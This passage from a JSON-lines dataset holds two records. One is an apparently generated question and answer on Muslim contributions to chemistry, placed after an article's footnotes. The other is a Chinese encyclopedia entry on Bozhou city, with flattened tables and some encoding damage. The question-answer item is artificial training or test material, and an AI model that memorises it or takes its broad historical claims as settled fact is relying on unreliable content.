in R. Halleux, \"The Reception of Arabic Alchemy in the West\", in Encyclopedia of the History of Arabic Science, London, 1996, vol. 3, pp. 886-902, at p. 892.\n[23] R. Halleux, \"The Reception\", op. cit., p. 892.\n[24] See for instance: M. Berthelot: Les Origines de l'Alchimie, Paris 1885, reprinted Paris, 1938; M. Berthelot: La Chimie au Moyen Age, III: l'Alchimie Arabe', texts and translations in collaboration with O. Houdas, Paris, 1893, reprinted Amsterdam, 1968; E.J. Holmyard, Alchemy, London, 1957; P. Kraus, Jabir Ibn Hayyan. Textes choisis, Paris, Cairo, 1935; J. Ruska, \"Al-Rasi (Rhases) als Chemiker\", Zeitschrift fur Angewandte Chemie 35, 1912, pp. 719-24; J. Ruska, \"Die Alchemie des Avicenna\", Isis 21, 1933: pp. 14-51; J.Ruska, \"Die Alchemie ar-Razi's\", Der Islam 22, 1935: pp. 281-319; J. Ruska, Das Buch der Alaune und Salze, Berlin, 1935.\n[25] For further details on the subject of pharmacology, see S.K. Hamarneh and G. Sonnedecker: A Pharmaceutical View of Abulcasis al-Zahrawi in Moorish Spain, with Special Reference to the Adhan, Leiden, coll. Janus, suppl. 5, 1963; M. Levey, Early Arabic Pharmacology, Leiden, 1973; Max Meyerhoff, \"Esquisse d'histoire de la pharmacologie et de la botanique chez les Musulmans d'Espagne\", Al-Andalus vol. 3, 1935, pp. 1-41.\n[26] M. Levey, Early Arabic Pharmacology, op. cit., pp 68-70.\n[27] Max Meyerhoff, \"Science and Medicine\", in The Legacy of Islam, edited by Thomas Arnold and A. Guillaume, Oxford University Press, 1931, pp. 311-55, at p. 331.\n[28] Volume 2 includes the names of simple drugs arranged in alphabetical order.\n[29] Max Meyerhoff, \"Science and Medicine\", op. cit., pp. 331-32.\n[30] A. Fonahn, Janus 14, 349-53, 1909; quoted in M. Levey, Early Arabic Pharmacology, op. cit., p. 74.\n[31] M. Levey, Early Arabic, op. cit., pp 74-75.\nSalim T S Al-Hassani: Hon. Chairman Foundation for Science, Technology and Civilisation, UK and Emeritus Professor at the University of Manchester, UK.\n**Mohammed Abattouy: Professor of History and Philosophy of Science, Mohammed Vth University, Rabat. Senior Research Fellow, Foundation for Science, Technology and Civilisation (FSTC), Manchester, UK. Chief Editor: MuslimHeritage.com.\nJabir Ibn Hayan\nhistory chemistry\nal-chemy\nal-Majriti\nSabur ibn Sahl\nAl-Jazari's Third Water-Raising Device: Analysis of its Mathematical and Me...\nProfessor Salim Al-Hassani published in the issue 369 (Spring 2012, p. 10) of...\nProf. Salim T S Al-Hassani In this pioneering survey of some of the machines of...", "question": " How did Muslim scientists contribute to the field of chemistry?", "answer": " Muslim scientists contributed to the field of chemistry in several ways:\n\n1) They pioneered the experimental scientific method in chemistry, recognizing the importance of experimentation and practical work. Scholars like Jabir ibn Hayyan and Al-Razi emphasized the need for conducting experiments and performing practical work to fully understand and master the subject.\n\n2) They made key chemical discoveries, such as inventing distillation apparatus like the alembic, still, and retort, which could purify chemical substances. They also created acids like muriatic, sulfuric, nitric, and acetic.\n\n3) They invented procedures to produce distilled water and purified distilled alcohol. They applied chemical transformation in industry like perfumery and made discoveries like that aqua regia could dissolve noble metals.\n\n4) Many chemical substances and apparatus that shaped the history of chemical processes are of Islamic origin, like the words elixir, alembic, and alcohol. Key symbols like Na and K also originated from Arabic names.\n\n5) Muslim scientists wrote pharmacopoeia and literature on pharmacology, laying foundations for modern pharmacy.\n\nIn summary, Muslim scientists made significant contributions by pioneering experimental methods, making key discoveries, developing apparatus, contributing to various chemical industries, and advancing pharmacology. Their legacy continues to influence modern chemistry."}
{"text": "亳州\n亳（bó）州，简称亳，古称“谯（qiao）城”，安徽省地级市。亳州是国家历史文化名城 ，新石器时代就有人类在此活动，是中华民族古老文化的发祥地之一。炎黄时代，帝喾（黄帝曾孙）代颛顼为帝，都于亳。商成汤灭夏建立商朝，在亳立都190年。 自秦时置谯县以来，历经朝代更迭，大都系州、郡或县建制，其间魏黄初二年（221年）封谯郡为 “陪都”。元至正15年（1355），刘福通拥韩林儿在亳州称帝，建\"宋\"政权，以亳州为国都，亳州正式成为\"三朝\"古都之地。 亳州市辖涡阳、蒙城、利辛和谯城三县一区，其中谯城区为市委、市政府机关所在地。中心城区规划面积扩大到218平方公里， 城镇化率年均增速居安徽省第1位。亳州有现代中药、白酒、食品制造及农产品加工、汽车及零部件、文化旅游、煤化工及新能源、电子信息、现代服务业、战略性新兴产业、劳动密集型装备制造等十大产业。亳州是中原地区连接长三角世界级城市群的桥头堡 [3-4] ，中国优秀旅游城市 ，长三角城市群成员城市、世界中医药之都、 百强药企业半数落户亳州， 是全球最大的中药材集散中心和价格形成中心。皖北旅游中心城市 和省域交汇中心城市。中原城市群核心发展区。 [8-9] 2020年8月，全国双拥工作领导小组办公室授予亳州“全国双拥模范城市”称号。 [10-11]\n历史沿革 夏时，亳州境西北为有虞氏，东南为涂山氏。 [12] 商成汤灭夏建立商朝，在亳立都190年。商时，亳州境内建有嵇方国。西周，周武王封神农之后建立的姜姓焦国，由河南陕县迁都于此，并修筑焦城 [12] 。春秋初期，焦国被陈国所灭，焦城属陈国。鲁僖公二十三年（前637年），楚国伐陈国，夺取境内的焦城、夷邑（今城父镇）。 [15] 秦时，置谯县、城父县，属泗水郡。谯县后隶属砀郡。西汉时，属沛郡。东汉建武十八年，（42年）在谯县治豫州刺史部。东汉时期州成为一级行政区，其中豫州刺史部治所为谯郡（今安徽省亳州） [16] 。辖区在今河南南部、今淮河以北伏牛山以东的河南东部、安徽北部、江苏西北角及山东西南角。下辖颍川郡、汝南郡2郡，梁国、沛国、陈国、鲁国4国，县九十七个。建安二十四年公元219年正月，分沛国治谯郡谯县治所 [17] 。注解：东汉时期行政名称，比如幽州是蓟县（今北京），豫州是谯县（今亳州）等等，并非指的是县城。《颍川郡，汝南郡，梁国，沛国，陈国，鲁国，这些只是地界名称并没有实权。类似今天华北地区，华南地区，北京虽然属于华北，但是北京管辖华北 ，同样的道理谯县虽然是沛国地界，但是谯县管辖沛国。谯县代表是豫州。豫州刺史部相当于现在中央一级政府，直接管辖两郡，四国，九十七个县》。 三国时期，魏黄初二年（221年），封谯郡为 “陪都”，与许昌、长安、洛阳、邺并称 “五都”。谯郡辖相县、萧县、酂县、费亭、苦县、宋县、城父县、山桑县、铚县、竹邑县、符离县、蕲县、洨县、龙亢县、虹县。西晋时，在此置谯国，后又为谯郡，治谯县。北魏正始四年（507年），为南兖州治所。北周建德六年（577年），北周灭北齐，南兖州属于北周。鉴于谯城为军政重镇，北周在谯县设置总管府，统辖数州。北周大象元年（579年），周静帝将南兖州改称亳州。隋大业三年（607年），改亳州为谯郡。唐武德四年（621年），谯郡更名为亳州，下辖谯县（今谯城区）、山桑县（今蒙城县）、城父县（今谯城区城父镇）、临涣县（今安徽濉溪临涣镇）、酂县（今河南永城酂城镇）、鹿邑县（今河南鹿邑县西南）、永城县（今河南永城）、真源县（今鹿邑县）8县。武德五年（622年），在亳州置总管府，辖亳、宋、颍、沈、谯等州。武德七年（624年）改亳州总管府为都督府。宋时，亳州属淮南路，宋真宗升亳州为集庆军，置节度使，统县七。金时，属南京路，下辖6县5镇。 元时，亳州属汴梁路，下辖6县。元至正十五年（1355年），刘福通起兵反元，拥韩林儿于亳州称帝，建 “韩宋”政权，以亳州为都城三年。明朝初年，亳州为县，属南直隶凤阳府。弘治九年（1496年），又升县为州，境内设义门巡检司。清初，亳州属安徽布政使司直辖。雍正二年，亳州辖谯县、太和县、蒙城县（今蒙城、涡阳和利辛部分地区）1864年，清廷镇压捻军后，析谯县、蒙城县、阜阳县各一部设涡阳县。民国元年（1912年），改亳州为亳县，属安徽省。1947年，设亳城市，辖亳县和郊区。1964年，国务院决定从阜阳、涡阳、蒙城、凤台各划出一部成立利辛县。1986年3月，经国务院批准，改亳县为亳州市（县级），隶安徽省阜阳地区，以原亳县行政区域为亳州市行政区域。同年6月4日召开亳州市成立大会 [18] 。1998年1月14日省委、省政府决定，亳州市改由省直辖 [19] （副地级） [2] 。2000年5月11日，国务院【国函〔2000〕47号】批复，2000年6月1日安徽省人民政府【皖政秘100号】通知：��销县级亳州市，设立地级亳州市。亳州市人民政府驻新设立的谯城区。亳州市设立谯城区，以原县级亳州市的行政区域为谯城区的行政区域。谯城区人民政府驻文化巷。将阜阳市管辖的涡阳县、蒙城县、利辛县划归新设立的地级亳州市管辖。亳州市辖涡阳县、蒙城县、利辛县和新设立的谯城区。 [20] 行政区划 截至2016年底，亳州市辖涡阳县、蒙城县、利辛县和谯城区3县1区，其中谯城区为市委、市政府机关所在地，全市共有乡镇、街道89个，其中乡镇79个，街道10个。政府驻谯城区希夷大道588号。区划详情地 名驻地人口（万人）面积（平方公里）行政区划代码邮编谯城区花戏楼街道1662226341602236800涡阳县城关街道1612107341621233600蒙城县城关街道1352091341622233500利辛县城关镇1602005341623236700资料来源 [21] 地理环境 地理位置 亳州市位于安徽省西北部，地处华北平原南端，距省城合肥330公里，位于东经115°53′～116°49′、北纬32°51′～35°05′，北依河南省商丘市，西与周口市鹿邑县接壤，西南部与阜阳市毗连，东部与淮北市、蚌埠市相倚，东南部与淮南市为邻，面积8374平方公里。 地形地貌 亳州市全境呈东南西北向斜长形，整个亳州地势西北高而东南低，以1/9000地面自然坡降向东南微倾。西北部谯城区詹楼地势最高，海拔42.5米；东南以利辛县展沟南部最低，海拔22米，相对落差20.5米。由于受河流蜿蜒切割变迁和黄河历次南泛的影响，形成平原中岗、坡、碟形洼地相间分布，具有“大平小不平”的地貌特征。亳州市辖境与黄河决口扇形地相连，属平原地带，地势平坦，仅东部有龙山、石弓山、齐山、狼山、双锁山等10余处石灰岩残丘分布，除蒙城和涡阳零星分布的剥蚀残丘以外总体为典型的黄淮堆积型地貌，为近代黄河泛滥沉积区域，微地貌分为河漫滩、泛滥微高地、泛滥坡平地、决口扇形地、河间洼地、河间平地、低丘7种类型。 土壤 亳州市土壤类型主要有砂礓黑土、潮土、棕壤土和石灰土。其中砂礓黑土（又叫青黑土）是一种具有腐泥状黑土层和浅育性砂礓层的暗色土壤，是古老的农业区耕作土壤之一，分布面积最大，约占全区总面积的71.6%；潮土系黄泛沉积物发育而成，约占总面积的23.2%；棕壤土系老的黄土性冲击母质所形成，分布于河流中游沿岸，呈带状分布，占土地总面积的1.5%。石灰土系以石灰岩为主的风化积物发育而成，均集中在小山丘周围，约占土地面积的3.7%。 气候 亳州市气候处在暖温带南缘，属于暖温带半湿润气候区，有明显的过渡性特征，主要表现为季风明显，气候温和，光照充足，雨量适中，无霜期长，四季分明，春温多变，夏雨集中，秋高气爽，冬长且干。因气候的过渡性，造成冷暖气团交锋频繁，天气多变，年际降水变化大，全市历年平均气温14.9℃，平均日照2184小时，平均无霜期213天，平均年降水量831毫米。 水文 亳州市辖区内流域面积10平方公里以上河道367条，50平方公里以上河道72条，100 平方公里以上河道42条，分属淮河水系和洪泽湖水系。主要干流河道有涡河、西淝河、茨淮新河、北淝河、芡河等。涡河左岸自谯城区牛集镇灵子门行政村代桥自然村首先入境，东南流经涡阳县至蒙城县移村集出境入怀远县，境内长173公里，流域面积4039平方公里；西淝河自谯城区淝河镇入境，东南流经涡阳县，至利辛县展沟镇出境 入凤台、颍上县界，境内长123.4公里，流域面积1871平方公里；茨淮新河自利辛县大李集镇入境，向东流经利辛县境南部，至蒙城县邹楼出境入怀远县，境内长66公里，流域面积1401平方公里。亳州市主要水系基本情况表河流名称河长（公里）境内流域面积（平方公里）流经县（区）涡河1773772谯城区、涡阳县、蒙城县西淝河（上段）991871谯城区、涡阳县、利辛县西淝河（下段）26396利辛县茨淮新河651407利辛县、蒙城县北淝河55844涡阳县、蒙城县包河58351谯城区、涡阳县芡河801328涡阳县、利辛县、蒙城县资料来源 自然资源 土地资源 亳州市土地总面积为852258公顷，其中农用地面积707929公顷，建设用地面积124790公顷，未利用地面积19539公顷。2005年土地利用现状变更调查资料显示：亳州市有农用地707929.44公顷，占土地总面积的83.07%，其中耕地598701.97公顷，在三县一区土地利用中均占主体地位，在各县区空间上的分布较为均匀；园地6725.02公顷，主要分布于谯城区；林地23189.03公顷，在各县区均有分布，以谯城区为最；牧草地108.11公顷，约80%的牧草地分布于涡阳县；其他农用地79205.31公顷，各县区其他农用地在其农用地中所占比例以蒙城县为最高，其次是利辛县。亳州市有建设用地124789.60公顷，占土地总面积的14.64%，其中城乡建设用地105135.62公顷，各县区城乡建设用地占其建设用地总规模比例介于76.49%-90.37%之间，高低顺序依次为谯���区、涡阳县、蒙城县、利辛县；交通运输用地8987.81公顷，均匀分布于各县区；水利设施用地9484.50公顷，过半分布于利辛县；其他建设用地1181.67公顷，主要分布于涡阳县、蒙城县。亳州市有其他土地19538.94公顷，占土地总面积的2.29%，在各县区分布比例谯城最高，利辛最低，涡阳、蒙城两县居于两者之间。亳州市境内主要湿地公园类型名称面积（平方公里）国家湿地公园蒙城北淝河国家湿地公园8.95利辛西淝河国家湿地公园5.86涡阳道源国家湿地公园4.26省级湿地公园利辛阚泽省级湿地公园4.25资料来源 矿产资源 亳州市地下煤炭、石油资源非常丰富，累计查明资源储量57亿吨，其中煤炭储量达50.2亿吨，位列全省第三位。 [22] 生物资源 截至2015年底，亳州市活立木总蓄积量1227.51万立方米，森林覆盖率18.26%，林木绿化率22.14%。亳州市中药材种植400多个品种，种植面积52.28千公顷，在中国《药典》上冠以“亳”字的就有亳芍、亳菊、亳桑皮、亳花粉。 人口 2014年，亳州市户籍人口634.4万人，比2013年增加1.44万人；常住人口为499.6万人，城镇化率35.7%，较2015年提高了1.3个百分点；全年出生人口9.5万人，人口出生率为15.0‰；死亡人口5万人，死亡率为7.8‰；人口自然增长率7.2‰。2015年，亳州市户籍人口635万人，比2014年增加0.6万人；常住人口为504.7万人，城镇化率37%，较2015年提高了1.3个百分点；全年出生人口11.9万人，人口出生率为18.8‰；死亡人口4.2万人，死亡率为6.5‰；人口自然增长率12.3‰。2016年，亳州市户籍人口646.8万人，比2015年增加11.9万人；常住人口为510.4万人，城镇化率38.3%，较2015年提高了1.3个百分点；全年出生人口11.3万人，人口出生率为17.4‰；死亡人口2.7万人，死亡率为4.2‰；人口自然增长率13.3‰。2017年，亳州市户籍人口650.8万人，比2016年增加3.9万人；常住人口为516.9万人，城镇化率39.8%，较上2016年提高了1.5个百分点；全年出生人口12.4万人，人口出生率为19.1‰；死亡人口8.1万人，死亡率为12.4‰；人口自然增长率6.7‰。2018年，亳州市户籍人口656.8万人，比上年增加6万人；常住人口为523.7万人，城镇化率41%，较上年提高了1.2个百分点；全年出生人口10.5万人，人口出生率为16‰；死亡人口3.8万人，死亡率为5.8‰；人口自然增长率10.3‰。2019年末全市户籍人口663.0万人，比上年增加6.2万人；常住人口为526.3万人，比上年增加2.6万人；城镇化率42.2%，较上年提高了1.2个百分点；全年出生人口9.0万人，人口出生率为13.6‰；��亡人口1.5万人，死亡率为2.3‰；人口自然增长率10.3‰。2015年各县区人口主要指标地区常住人口（万人）户籍人口（万人）城镇化率（%）亳州市504.7634.936.96谯城区146.8163.243.22涡阳县126.1164.533.94蒙城县110.2139.534.49利辛县121.6167.834.76资料来源2010年，亳州市有29个民族，9万余名少数民族人口，少数民族人口占全省五分之一，有17个民族村（社区），74个民族自然村。回族占全市少数民族人口97.5%以上，主要分布在谯城区、涡阳县。分布呈现大杂居、小聚居和围寺而居的情况。 [23] 政治 市委副书记、市长：杜延安常务副市长：刘辉副市长：李军、邹桂武、侯化、曹振萍、应国君 经济 综述 2019年，亳州市全年生产总值（GDP）1749.0亿元，按可比价格计算，比上年增长9.4%。分产业看，第一产业增加值238.2亿元，增长4.0%；第二产业增加值621.8亿元，增长10.5%；第三产业增加值889.0亿元，增长10.2%。三次产业结构由上年的13.6 :35.7:50.7调整为13.6:35.6:50.8，其中工业增加值占GDP比重为25.7%。人均GDP33314元，比上年增加3498元。2019年，亳州市全年财政收入214.3亿元，比上年增长7.1%，其中地方财政收入126.1亿元，增长12.6%。全部财政收入中，增值税增长9.8%，企业所得税增长4.4%。财政支出373.4亿元，增长8.7%，科学技术、教育、卫生健康、社会保障和就业分别增长10.9%、19.5%、8.7%、11.4%。全市民生支出307.2亿元，占总支出的82.3%。深入实施33项民生工程，累计投入195.5亿元，比上年增长15.2%。 [13] 第一产业 亳州市粮食作物以小麦、玉米、大豆为主，是全国粮食主产区之一；经济作物以玉米、棉花、烟叶、蔬菜为主；畜禽养殖业发达，涡阳、蒙城、利辛曾被誉为“黄牛金三角”。2018年，全年粮食作物种植面积875.5千公顷，比上年扩大5.5千公顷，建设优质专用粮食生产基地138.7千公顷。油料种植面积7.4千公顷，扩大1.3千公顷。棉花种植面积1.6千公顷，扩大0.1千公顷。蔬菜种植面积68.3千公顷，扩大3.6千公顷。中药材种植面积56.6千公顷，扩大6.8千公顷。2018年，全年粮食产量487.8万吨，下降2.6%。其中，夏粮302.3万吨，下降3.6%；秋粮185.5万吨，下降0.9%。油料产量3.9万吨，增长5.1%。棉花产量0.2万吨，增长11.8%。蔬菜产量269.9万吨，增长6.8%。2018年末，全市生猪存栏123.3万头，比上年下降0.7%；全年生猪出栏260.7万头，增长2.9%。肉类总产量30万吨，增长4.8%，其中猪牛羊肉产量21万吨，增长2%。禽蛋产量7万吨，增���2.5%。牛奶产量0.8万吨，增长16.7%。水产品产量5.1万吨，增长1.8%。2018年末，全市农业机械总动力780.5万千瓦，比上年增长3%。成为全国唯一实现主要农作物生产全程机械化示范县区全覆盖的省辖市。加强农产品质量安全监管工作，新建农产品安全民生工程快速检测体系77套。新认证“三品一标”企业38家、产品73个，新增巩店香椿等3个国家地理标志保护产品。2018年末，全市市级以上农业龙头企业达549家，较上年新增6家，其中国家级4家，省级50家。全市新建农民专业合作社省级示范点（社）11个，年末拥有农民专业合作组织19905个，合作组织成员111.2万人。获批省级以上休闲农业示范点1个、省五星级农家乐1个，建成扶贫农家小院40家。 第二产业 亳州市战略性新兴产业有七大领域，分别是：新能源汽车产业、新一代信息技术业、生物产业、新能源产业、新材料产业、高端装备制造产业、节能环保产业。2018年末，全市规模以上工业企业达905户。全年规模以上工业企业实现增加值比上年增长11.8%。国有企业和股份制企业生产增长较快，增幅分别比规模工业高了1.9个和0.4个百分点。2018年，全市32个工业行业中，23个保持增长，增长面达71.9%。煤炭开采和洗选业增长51.4%，农副食品加工业增长9.8%，酒、饮料和精制茶制造业增长12.6%，医药制造业增长7.8%，电气机械和器材制造业增长61.5%，五大主导行业对全市规模以上工业增长贡献率达65.9%。高新技术产业增加值增长16.1%。战略性新兴产业产值增长14.8%；农产品加工产值增长10.1%；高新技术产业产值增长17.5%。 2018年，全市规模以上工业统计的主要产品产量中，精制食用植物油增长26.5%、鲜、冷藏肉增长20.4%、白酒增长2.7%、服装增长55.7%、塑料制品增长38%、商品混凝土增长125.6%。2018年，全市规模以上工业企业经济效益综合指数267.7%。企业主营业务收入增长2.9%；利税增长5.2%，其中利润增长4%。农副食品加工业，食品制造业，酒、饮料和精茶制造业，医药制造业，金属制品业，非金属矿物制品业，木材加工和木、竹、藤、棕、草制品业，计算机、通信和其他电子设备制造，电力、热力生产和供应业，煤炭开采和洗选业等10个行业利润均超亿元。2018年，全年全社会建筑业增加值97.2亿元，比上年增长11.3%。房屋建筑施工面积661.5万平方米，比上年减少106.1万平方米；房屋竣工面积405.4万平方米，比上年增加67.6万平方米。工业园区园区��别成立时间亳州市经济技术开发区省级经济开发区1993年4月亳州芜湖现代产业园省级重点经济开发区2012年安徽谯城经济开发区省级园区2006年4月安徽涡阳经济开发区省级经济开发区2006年安徽蒙城经济开发区--2001年3月安徽利辛经济开发区--2003年5月19日资料来源 [24] 第三产业 2018年，全年社会消费品零售总额590亿元，比上年增长11.6%。按经营地统计，城镇消费品零售额440.2亿元，增长11.6%；乡村消费品零售额149.8亿元，增长11.7%。按消费形态统计，商品零售额518.6亿元，增长11.1%；餐饮收入71.4亿元，增长15.7%。其中，限额以上单位零售额195.8亿元，增长12.3%。2018年，全市限额以上企业商品零售额中，吃、穿、用类商品零售额分别比上年增长20.8%、11.5%和9.9%。其中，粮油类增长24.8%，肉禽蛋类增长16.3%，服装类增长11.7%，化妆品类增长9.4%，日用品类增长2.4%，中西药品类增长8%，家用电器和音像器材类增长15.4%，石油及制品类增长11.2%，汽车类增长7.1%。2018年，全年进出口总额8.3亿美元，比上年增长25.4%。其中，出口7.2亿美元，增长19.1%；进口1.2亿美元，增长87.4%。从出口经营主体看，生产型企业出口增长7%，贸易型企业出口增长99%。从出口商品看，机电产品和高新技术产品出口分别增长86.3%和6.9%。大力实施外贸主体培育壮大工程，孵化进出口实绩企业63家。先后组织44家企业参加境内外展会，达成出口成交额近亿美元；组织112家企业参加首届中国国际进口博览会。2018年，全年新批外商投资企业7家；实际到位省外资金722.3亿元，增长36.1%；实际利用外商直接投资9亿美元，增长15.4%。组织参加2018世界制造业大会和中国国际徽商大会，全市集中签约和招商活动签约项目73个，总签约金额795亿元，同比增长10.7 %。积极推动企业“走出去”开展对外合作，培育3家外经主体。2018年，全年入境旅游人数10.4万人次，比上年增长32.2%；国内游客2697.9万人次，增长18.4%。旅游总收入205.8亿元，增长19.9%。其中，旅游外汇收入2254.7万美元，增长27.9%；国内旅游收入204.4亿元，增长19.9%。年末全市共有4A级旅游景点(区)7处，星级酒店16家，旅行社30家。建成北部游客集散服务中心、林拥城景区旅游服务综合体，新建旅游停车场36个、旅游标识标牌160块，新建改建旅游厕所200座。推出“道源问道”中华传统文化之旅精品��范线路，获批国家级中医药健康旅游示范基地1个、省级2个。大力实施旅游富民工程，推出乡村旅游精品线路7条，成功创建省优秀旅游乡镇6个、旅游示范村12个，获批省乡村旅游创客示范基地3个。2018年末，全市金融机构各项存款余额（人民币口径，下同）2112.7亿元，比上年末增加269.4亿元，增长14.6%。其中，非金融企业存款余额440.1亿元，增长13.8%；住户存款余额1277.7亿元，增长13.9%。金融机构各项贷款余额1662.8亿元，比上年末增加325.6亿元，增长24.4%。其中，短期贷款705.4亿元，增长7.6%；中长期贷款935.7亿元，增长39%，中长期贷款中个人消费贷款414.2亿元，增长39.8%。 社会事业 城市建设 2018年，全年共投入城市建设维护资金15. 6亿元。市区新修主干路网26.8公里，配套设施正在完善。市主城区新增道路补盲摄像机3100台；新增医院、学校、景区、龙头企业重点部位补盲摄像机1500台；市视频数据平台摄像机接入达6.3万台。城市日供水综合能力16.1万吨，自来水普及率达99.5%。液化气年家庭用量0.2万吨，用气人口35.4万人，城市气化率达97 %。年末园林绿地面积3708.2公顷，建成区绿化覆盖率为37.3%，人均公共绿地面积15.9平方米。中心城区发展边界增加到218平方公里，城市蓝线、绿地布局、建设用地性质得到科学优化调整。三县一区新城区路网、电网、水网、绿化、亮化等基础设施加快推进，老城区老旧小区、雨污分流管网、小街巷改造和断头路打通等工程有序实施，新城建设、老城改造齐头并进、持续提速，群众居住环境进一步改善。 2018年，全年全市新农村建设规划48处，规划面积934.7万平方米，竣工面积565.3万平方米，搬迁农户7223户。全年市级美丽乡村财政专项投入42959.8万元，省级中心村编制建设项目645个。深入推进农村环境“三大革命”，建成乡镇污水处理设施80个，改造农村厕所10.2万户，回收有毒有害垃圾3583吨。拆除农村破旧房屋248.3万平方米。完成城乡建设用地增减挂钩项目3.1万亩，整改违法用地3484亩，补充耕地3万亩，建成高标准基本农田91万亩。建设“四好农村路”2060公里，改造农村公路危桥152座，新增通客车建制村40个。完成农村电网升级改造投资2.7亿元。铺设天然气镇镇通管道84.9公里。村级红白理事会实现全覆盖。 教育 2018年末，全市普通高校2所，在校学生1.3万人。各类中等职业学校（不含技工学校）24所，在校生6.2万人。普通高中27所，在校生8.5万人，高中阶段毛入学率93.5%，比上年上升0.2个百分点。普通初中267所，在校生23万人，初中阶段适龄人口入学率100%。小学1115所，在校生53.1万人，小学学龄儿童入学率100%。各级各类成人学校毕业生1.1万人。全面实施免费义务教育，受益学生76.3万人。“教育扶贫联络员架起农村娃扶智连心桥”的工作经验被国家扶贫领导小组推荐为“2018年全国扶贫优秀案例”。高考实现历史性突破，考入北大、清华的学生总数突破8人。高等院校学校办学层次地址亳州学院本科亳州市经济开发区汤王大道2266号亳州职业技术学院高职专科谯城区药都路1625号资料来源安徽省级示范中学亳州市第一中学亳州市第二中学涡阳县第一中学涡阳县第二中学涡阳县第四中学蒙城县第一中学利辛县第一中学利辛高级中学 医疗卫生 2018年末，全市共有卫生机构1890个，其中医院78个，卫生院92个，社区卫生服务中心（站）115个，妇幼保健院（所、站） 5个，疾病预防控制中心5个。卫生技术人员19991人，其中执业（助理）医师7197人，注册护士8904人。医院、卫生院实有床位数21454张。全年诊疗2252.6万人次。村卫生室1288个，乡村医生和卫生员5228人，农村有医疗点的村占总村数的100%。参加新型农村合作医疗的农业人口562.4万人，参合率达105.7%。亳州市主要医院亳州市人民医院亳州市中医院亳州市华佗中医院亳州市第五人民医院 [25] 涡阳县人民医院涡阳县中医院蒙城县第一人民医院蒙城县中医院利辛县人民医院利辛县中医院 科技 2018年末，全市有各类专业技术人员5.3万人，比上年增长2.1%。全市新认定高新技术企业49家，全社会研发经费增长26.7%。获评国家知识产权示范企业、国家和省知识产权优势企业13家，获批建设省技术创新中心、省重点实验室各1个，获批省重大新兴产业专项和省重大科技专项11项，新增省技术创新示范企业、省级企业技术中心14家，青年创客空间获评省级科技企业孵化器，市中医药产业技术研究院正式成立。聚力招才引智，新建高水平创新平台5个，新增院士、博士后科研工作站6家，引进高层次创新人才45人。全年受理专利申请6154件，授权专利2007件。 体育 2018年末，全市共有体育场地1440个，其中体育场17个，体育馆2座。全年在国际和国内的重大比赛中，我市运动健儿获30枚金牌、26枚银牌和43枚铜牌。“全民健身”系列主题活动蓬勃开展，全年共举办百人以上群众体育活动170次，其中现代体育项目群众活动131次，民间传统体育群众活动39次。初步建成“十五分钟健身圈”，市体育馆正式投用，国际全程马拉松赛、全国航模公开赛等20余项知名赛事在我市举办。 文化 2018年末，全市共有专业艺术表演团体286个，文化馆5个，公共图书馆5个，博物馆6个，乡镇综合文化站85个，省级文化产业示范园区1个，省级文化产业示范基地基地3个。全市农村公益电影放映17543场，送戏下乡2635场，为全市1424个农家书屋配送图书10.6万册。全市组织群众文化活动800多场次、开展城市广场公益演出300场、组织扶贫文艺宣传演出79场、送戏进敬老院300场，完成627个数字农家书屋建设。全国重点文物保护单位7处，省级重点文物保护单位38处，市级重点文物保护单位66处。国家级非物质文化遗产名录3项，省级名录38项，市级名录112项。广播电台4 座，中波发射台和转播台1座，广播人口覆盖率100%。电视台4座，有线电视用户7.2万户，电视综合人口覆盖率100%。全年出版报纸 2种，总印数1007万份。市文化馆正式建成，市广电中心主体封顶，市数字档案馆基本建成，市博物馆成为全省首家夜间开放的博物馆。类别场馆名称博物馆亳州市博物馆蒙城博物馆中国白酒博物馆---博览园古井酒文化博览园---纪念馆板桥集战斗纪念馆曹操纪念馆资料来源 社会保障 2018年末，全市参加城镇职工基本养老保险27.3万人，城镇职工基本医疗保险25万人，参加失业保险人数为16.1万人。全市参加工伤、生育保险人数分别为25.7万人和20.6万人。被征地农民养老保险制度全面推进，年末被征地农民参保人数15.8万人。全市城乡低保水平进一步提升，全年发放低保金4.7亿元，城镇低保年末保障1万人，农村低保年末保障16.7万人。2018年末，全市有各类收养性社会福利单位床位3.2万张，收养各类人员1.1万人。城镇建立各种社区服务设施648个，乡镇、街道及县（市、区）级社区服务中心88个，综合性社区服务站101个。全年销售社会福利彩票3.1亿元，筹集公益金3226.8万元。 交通运输 综述 2018年，全年公路旅客运输量3496万人，下降13.3%，公路和水运货物运输量35027万吨，增长3%；公路旅客运输周转量30亿人公里，下降9.4%，公路和水运货物运输周转量983.4亿吨公里，增长5.5%。全年港口货物吞吐量255万吨，下降76.1%。2018年末，全市民用汽车拥有量57.8万辆，比上年增长14.5%，其中私人汽车49.9万辆，增长14.7%。轿车拥有量24.4万辆，增长16%，其中私人轿车23.6万辆，增长16.1%。全市城区年末公��营运车辆1240辆，出租车营运车辆3005辆。“十三五”期间，亳州机场至高铁南站轨道交通将开始建设，投资30亿元。 [26] 公路 亳州市内有311国道、105国道和202、203、224、305、307、308省道在此交汇，济广高速公路（济南-广州），宁洛高速公路（南京-洛阳），许亳高速公路（许昌-亳州），宿登高速公路（宿州-登封）、济祁高速公路（济宁-祁门）构成亳州市“井”字型高速公路网。S307一级公路完成改造，济祁高速永利段等建成投入使用。 [27] 铁路 亳州市内有京九铁路、青阜铁路纵贯全境，商合高速铁路、三洋铁路将贯穿亳州、亳蚌铁路开工建设 [28] ，亳州境内有客运站亳州站、涡阳站，商合高铁亳州段设三个客运站，分别为亳州南站、芦庙站、古城东站。 航空 2016年中国民航局正式批复亳州机场场址，场址位于亳州市谯城区和涡阳县交界处，机场跑道位于刘竹村，机场航站楼位于立德北侧标里镇崔楼村。机场总投资40亿元，其中机场轨道交通30亿元。 [14] 水运 亳州市内建有亳州大寺港、涡阳港、蒙城港、利辛港等，有涡河、茨淮新河、西淝河、阜蒙新河、利阚新河、惠济河等6条航道，航道总里程362公里，通航里程286公里。 [22] 地方文化 民风民俗 